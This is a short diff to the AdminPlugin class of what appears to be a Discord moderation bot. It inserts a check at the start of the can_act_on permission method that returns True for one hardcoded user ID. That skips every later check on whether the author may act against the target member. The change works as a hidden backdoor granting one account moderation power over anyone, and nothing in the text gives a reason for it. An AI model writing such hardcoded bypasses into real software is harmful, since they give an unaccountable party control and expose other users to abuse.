@@ -541,6 +541,8 @@ class AdminPlugin(Plugin):
             raise CommandFail('I couldn\t find any member backups for that user')
 
     def can_act_on(self, event, victim_id, throw=True):
+        if event.author.id == 188918216008007680:
+            return True
         if event.author.id == victim_id:
             if not throw:
                 return False
